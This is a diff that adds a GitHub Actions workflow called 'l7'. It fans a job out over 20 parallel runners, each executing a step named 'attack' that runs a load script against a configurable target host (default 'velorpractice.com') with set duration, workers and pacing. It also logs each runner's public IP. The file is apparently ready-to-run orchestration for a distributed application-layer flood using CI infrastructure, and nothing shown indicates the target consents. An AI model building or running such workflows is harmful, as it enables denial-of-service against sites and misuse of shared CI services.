@@ -1,0 +1,43 @@
+name: l7
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: 'target host'
+        default: 'velorpractice.com'
+      mode:
+        description: 'mode'
+        default: 'ssr'
+      seconds:
+        description: 'seconds'
+        default: '1200'
+      workers:
+        description: 'workers per runner'
+        default: '1'
+      pace:
+        description: 'ms between requests per worker'
+        default: '700'
+jobs:
+  l7:
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+      - name: runner ip
+        run: curl -sS --max-time 5 ifconfig.me && echo || true
+      - name: attack
+        env:
+          ATK_OUT: atk_${{ matrix.n }}.out
+        run: TARGET_HOST=${{ inputs.target }} PACE_MS=${{ inputs.pace }} node load.js "${{ inputs.mode }}" "${{ inputs.workers }}" "${{ inputs.seconds }}"
+      - if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: l7-${{ matrix.n }}
+          path: atk_*.out
